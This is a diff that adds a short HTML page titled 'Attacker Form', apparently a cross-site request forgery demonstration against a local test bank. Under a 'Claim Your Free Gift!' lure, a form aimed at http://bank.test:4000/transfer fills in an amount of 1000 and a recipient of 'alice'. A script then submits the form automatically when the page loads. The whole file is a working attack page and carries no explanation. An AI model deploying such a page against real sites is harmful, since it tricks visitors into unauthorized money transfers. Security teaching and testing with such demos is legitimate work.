@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Form</title>
+</head>
+<body>
+    <h2>Claim Your Free Gift!</h2>
+
+    <form id="attackForm"
+          method="POST"
+          action="http://bank.test:4000/transfer">
+        <input name="amount" value="1000" />
+        <input name="to" value="alice" />
+        <input type="submit" value="Send" />
+    </form>
+
+    <script>
+      window.onload = function () {
+        console.log('Submitting form...');
+        document.getElementById('attackForm').submit();
+      };
+    </script>
+</body>
+</html>
